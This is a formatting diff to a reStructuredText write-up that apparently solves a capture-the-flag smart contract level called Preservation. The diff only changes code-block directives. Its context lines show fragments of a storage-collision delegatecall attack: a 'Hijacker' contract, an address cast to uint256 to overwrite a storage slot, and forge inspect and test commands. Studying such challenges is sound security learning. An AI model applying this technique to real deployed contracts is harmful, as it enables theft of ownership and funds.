@@ -116,7 +116,7 @@ Concretely, the ``LibraryContract`` will set the first word of storage
 word of the Preservation storage to whatever I want, and what can I find
 there?
 
-.. code::
+.. code-block:: plain
 
     [I] > forge inspect --pretty  Preservation storageLayout
     | Name             | Type    | Slot | Offset | Bytes |
@@ -138,6 +138,7 @@ The ``setFirstTime`` function takes a uint256 and not an ``address``, so I'll
 have to do a bit of memory shuffling to get it just right:
 
 .. code-block:: solidity
+   :linenos: inline
 
     Hijacker hijacker = new Hijacker(attacker);
     uint256 spookyTimestamp = uint256(uint160(address(hijacker)));
@@ -151,6 +152,7 @@ that writes to the third storage slot when a ``setTime(uint256)`` is called on
 it:
 
 .. code-block:: solidity
+    :linenos: inline
 
     contract Hijacker {
         address private padding1;
@@ -169,7 +171,7 @@ it:
 
 ... let's check the storage layout:
 
-.. code::
+.. code-block:: plain
 
     [I] > forge inspect --pretty  Hijacker storageLayout
     | Name     | Type    | Slot | Offset | Bytes |
@@ -180,7 +182,7 @@ it:
 
 ... and run the thing:
 
-.. code::
+.. code-block:: plain
 
     [I] > forge test --mc Preservation
     [⠊] Compiling...
